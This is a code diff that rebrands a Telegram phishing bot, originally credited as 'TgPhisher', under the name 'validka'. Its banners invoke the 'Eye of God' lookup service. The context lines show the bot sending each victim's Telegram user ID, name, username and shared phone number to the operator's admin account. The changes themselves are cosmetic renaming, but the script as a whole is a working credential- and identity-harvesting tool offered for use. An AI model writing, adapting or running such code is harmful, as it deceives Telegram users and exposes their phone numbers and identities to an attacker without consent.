@@ -32,17 +32,25 @@ def print_user_data(user_id, first_name, username=None, phone_number=None):
 
 os.system('cls' if os.name == 'nt' else 'clear')
 print(f'''
-{bold}{blue}
-      ______      ____  __    _      __             
-     /_  __/___ _/ __ \/ /_  (_)____/ /_  ___  _____
-      / / / __ `/ /_/ / __ \/ / ___/ __ \/ _ \/ ___/
-     / / / /_/ / ____/ / / / (__  ) / / /  __/ /    
-    /_/  \__, /_/   /_/ /_/_/____/_/ /_/\___/_/     
-        /____/                                   
+{bold}{red}
+     _____
+< validka >
+ ---------
+    \
+     \
+                                   .::!!!!!!!:.
+  .!!!!!:.                        .:!!!!!!!!!!!!
+  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$
+      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P
+      $$$$$##WX!:      .<!!!!UW$$$$"  $$$$$$$$#
+      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$*
+      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R"
+        "*$bd$$$$      '*$$$$$$$$$$$o+#"
+             """"          """""""
+                                           ddrobil                           
 {reset}           
-                    .:ГЛАЗ БОГА:.    
-           {bold}{yellow}Telegram{reset}:{cyan} t.me/CyberStalker1337
-     {bold}{yellow}GitHub{reset}:{cyan} github.com/TheCyberStalker/TgPhisher
+                    .:glaz boga:.    
+           {bold}{yellow}tg{reset}:{cyan} t.me/ddrobil
 
       ''')
 def is_valid_token(token):
@@ -55,11 +63,11 @@ def is_valid_token(token):
     except telebot.apihelper.ApiException:
         return False
 
-token = input(f"     {blue}Введите токен вашего бота >> ")
-admin_id = input(f"     {blue}Введите ваш телеграм айди >> ")
+token = input(f"     {blue}введите токен вашего бота >> ")
+admin_id = input(f"     {blue}введите ваш телеграм айди >> ")
 
 if not is_valid_token(token):
-    print("{reset}     Неверный токен! Пожалуйста, повторите запуск скрипта")
+    print("{reset}     неверный токен. пожалуйста, повторите запуск скрипта")
 
 else:
     def get_bot_username(token):
@@ -76,22 +84,30 @@ else:
     if username:
         os.system('cls' if os.name == 'nt' else 'clear')
         print(f'''
-{bold}{blue}
-      ______      ____  __    _      __             
-     /_  __/___ _/ __ \/ /_  (_)____/ /_  ___  _____
-      / / / __ `/ /_/ / __ \/ / ___/ __ \/ _ \/ ___/
-     / / / /_/ / ____/ / / / (__  ) / / /  __/ /    
-    /_/  \__, /_/   /_/ /_/_/____/_/ /_/\___/_/     
-        /____/                                   
+{bold}{red}
+     _____
+< validka >
+ ---------
+    \
+     \
+                                   .::!!!!!!!:.
+  .!!!!!:.                        .:!!!!!!!!!!!!
+  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$
+      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P
+      $$$$$##WX!:      .<!!!!UW$$$$"  $$$$$$$$#
+      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$*
+      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R"
+        "*$bd$$$$      '*$$$$$$$$$$$o+#"
+             """"          """""""
+                                           ddrobil                           
 {reset}           
-                    .:ГЛАЗ БОГА:.    
-           {bold}{yellow}Telegram{reset}:{cyan} t.me/CyberStalker1337
-     {bold}{yellow}GitHub{reset}:{cyan} github.com/TheCyberStalker/TgPhisher
+                    .:glaz boga:.    
+           {bold}{yellow}tg{reset}:{cyan} t.me/ddrobil
 
       ''')
-        print(f"        Бот запущен!{reset} - {red}для выхода [ctrl + c]{reset}\n        Юзернейм вашего бота: {yellow}@{username}{reset}\n        Отправьте с вашего аккаунта\n        Команду {yellow}- /start{reset} боту.")
+        print(f"        бот запущен!{reset} - {red}для выхода [ctrl + c]{reset}\n        юз вашего бота: {yellow}@{username}{reset}\n        отправьте с вашего аккаунта\n        команду {yellow}- /start{reset} боту.")
     else:
-        print(f"\n     Бот запущен!{reset} - {red}для выхода [ctrl + c]{reset}")
+        print(f"\n     бот запущен!{reset} - {red}для выхода [ctrl + c]{reset}")
     bot = telebot.TeleBot(token)
     @bot.message_handler(commands=['start'])
     def send_welcome(message):
@@ -156,13 +172,13 @@ else:
                 print()
                 try:
                     bot.send_message(admin_id, f'''
-#TgPhisher - {username}
+#validka - {username}
 
 - {message.from_user.id}
 - {message.from_user.first_name}
 - {message.from_user.username}
 - {message.contact.phone_number}
-- By @CyberStalker1337''')
+- by ddrobil''')
                 except:
                     print('     error send to ADMIN_ID      ')
             else:
